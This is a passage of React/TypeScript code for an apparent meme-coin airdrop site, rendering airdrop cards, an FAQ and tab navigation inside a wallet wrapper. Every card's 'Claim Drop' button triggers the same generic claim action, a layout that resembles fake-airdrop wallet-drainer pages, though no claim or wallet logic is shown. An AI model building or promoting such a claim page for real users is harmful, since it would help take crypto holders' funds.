                </div>
              )}
            </div>
            <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent" />
          </div>
        ))}
      </div>
    </div>
  )
}

type AirdropItem = {
  id: number
  name: string
  symbol: string
  actions: string
  confirmed: boolean
  logo: string
  hot?: boolean
  hotValue?: number
  potential?: boolean
}

function AirdropCard({ airdrop }: { airdrop: AirdropItem }) {
  const claimAction = useClaimAction()

  const handleClaim = () => {
    if (claimAction?.disabled) return
    claimAction?.claim()
  }

  return (
    <div className="bg-white rounded-xl card-shadow hover:shadow-lg transition-all p-4">
      <div className="flex items-start gap-4">
        <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
          <span className="text-2xl font-bold text-gray-600">{airdrop.logo}</span>
        </div>

        <div className="flex-1 min-w-0">
          <div className="flex items-start justify-between">
            <div>
              <h3 className="font-bold text-gray-900">{airdrop.name}</h3>
              <p className="text-sm text-gray-500 mt-1">
                <span className="inline-flex items-center gap-1">
                  <Zap className="w-3 h-3" />
                  {airdrop.actions}
                </span>
              </p>
            </div>
            {airdrop.hot && (
              <div className="flex items-center gap-1 text-red-500 text-sm font-medium">
                <Flame className="w-4 h-4" />
                {airdrop.hotValue}°
              </div>
            )}
            {airdrop.potential && (
              <div className="flex items-center gap-1 text-purple-500 text-sm font-medium">
                <Sparkles className="w-4 h-4" />
                Potential
              </div>
            )}
          </div>

          <div className="flex items-center justify-between mt-4">
            {airdrop.confirmed ? (
              <span className="badge-confirmed">Confirmed</span>
            ) : (
              <span className="px-2 py-1 bg-purple-100 text-purple-700 text-xs font-medium rounded">Potential</span>
            )}
            <button
              onClick={handleClaim}
              disabled={claimAction?.disabled}
              className={`px-4 py-2 rounded-lg font-medium text-sm transition-all ${
                claimAction?.disabled
                  ? 'bg-emerald-100 text-emerald-700 cursor-default'
                  : 'bg-emerald-600 text-white hover:bg-emerald-700 shadow-md hover:shadow-lg'
              }`}
            >
              Claim Drop
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

function HomeContent() {
  return (
    <>
      <Tokens />
      <Banner />
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-10">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {AIRDROPS.latest.map((airdrop) => (
            <AirdropCard key={airdrop.id} airdrop={airdrop} />
          ))}
        </div>
      </div>
    </>
  )
}

function HotAirdropsPage() {
  return (
    <>
      <Banner />
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-10">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {AIRDROPS.hot.map((airdrop) => (
            <AirdropCard key={airdrop.id} airdrop={airdrop} />
          ))}
        </div>
      </div>
    </>
  )
}

function PotentialAirdropsPage() {
  return (
    <>
      <Banner />
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-10">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {AIRDROPS.potential.map((airdrop) => (
            <AirdropCard key={airdrop.id} airdrop={airdrop} />
          ))}
        </div>
      </div>
    </>
  )
}

function FAQPage() {
  const [openIndex, setOpenIndex] = useState<number | null>(null)

  return (
    <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <div className="mb-8 text-center">
        <h1 className="text-3xl font-bold text-gray-900 flex items-center justify-center gap-3">
          <HelpCircle className="w-8 h-8 text-emerald-500" />
          FAQ
        </h1>
        <p className="text-gray-600 mt-2">Answers to common questions about MemeBasePEPE.com</p>
      </div>

      <div className="space-y-4">
        {FAQ_DATA.map((faq, index) => (
          <div key={index} className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
            <button
              onClick={() => setOpenIndex(openIndex === index ? null : index)}
              className="w-full flex items-center justify-between p-5 text-left hover:bg-gray-50 transition-colors"
            >
              <span className="font-semibold text-gray-900">{faq.question}</span>
              {openIndex === index ? (
                <ChevronUp className="w-5 h-5 text-emerald-500" />
              ) : (
                <ChevronDown className="w-5 h-5 text-gray-400" />
              )}
            </button>
            {openIndex === index && (
              <div className="px-5 pb-5">
                <p className="text-gray-600 leading-relaxed">{faq.answer}</p>
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}

// Main App
function App() {
  const [activeTab, setActiveTab] = useState('latest')

  const renderContent = () => {
    switch (activeTab) {
      case 'hot':
        return <HotAirdropsPage />
      case 'potential':
        return <PotentialAirdropsPage />
      case 'faq':
        return <FAQPage />
      case 'contact':
        return <ContactPage />
      case 'latest':
      default:
        return <HomeContent />
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <Header activeTab={activeTab} setActiveTab={setActiveTab} />
      
      <main className="relative">
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute -top-40 -right-40 w-80 h-80 bg-gradient-to-br from-emerald-200/30 to-blue-200/30 rounded-full blur-3xl" />
          <div className="absolute top-1/2 -left-40 w-96 h-96 bg-gradient-to-br from-purple-200/20 to-pink-200/20 rounded-full blur-3xl" />
          <div className="absolute bottom-0 right-1/4 w-64 h-64 bg-gradient-to-br from-cyan-200/20 to-teal-200/20 rounded-full blur-3xl" />
        </div>
        
        <div className="relative">
          <WalletTokens>
            {renderContent()}
          </WalletTokens>
        </div>
      </main>
    </div>
  )
}

export default App
